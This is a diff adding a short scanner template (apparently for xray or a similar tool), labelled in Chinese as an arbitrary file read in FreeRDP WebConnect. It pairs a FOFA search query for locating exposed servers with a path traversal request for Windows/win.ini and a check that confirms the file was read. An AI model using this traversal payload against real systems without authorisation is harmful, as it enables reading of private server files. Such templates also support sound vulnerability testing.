@@ -1,0 +1,15 @@
+id: poc-yaml-freerdp-webconnect-url-anyfile-read
+info:
+  name: FreeRDP WebConnect Url 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: freerdp
+  fofa: body="css/vkb.css" || body="Advanced session parameters"
+requests:
+- method: GET
+  path: /../../../../Windows/win.ini
+  expression: status_code == 200 && contains(body,"[fonts]") && contains(body,"[files]")
+    && !contains(body,"<")
+variables: {}
+transport: http
